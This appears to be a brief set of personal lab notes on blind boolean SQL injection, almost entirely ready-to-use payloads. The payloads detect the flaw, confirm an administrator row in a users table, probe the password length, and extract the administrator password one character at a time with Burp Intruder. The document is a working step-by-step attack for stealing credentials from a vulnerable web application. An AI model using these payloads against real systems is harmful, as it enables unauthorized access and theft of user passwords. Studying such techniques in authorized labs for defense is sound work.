#sqli 

## Detection

```sql
anything' AND '1'='1
```
-> Normal message displayed.

```sql
anything' AND '1'='2
```
-> No message is displayed.

## Find Table Name
```sql
anything' AND (SELECT 'a' FROM users WHERE username='administrator')='a
```
-> Confirm table name and rows.

## Find the Number of Chars in Password
```sql
anything' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
```

```sql
anything' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a
```

```sql
anything' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a
```
...

## Extract Password (with Burp Intruder Cluster Bomb)
```sql
value' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
```

```sql
value' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='b
```
...


```sql
value' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a
```

```sql
value' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='b
```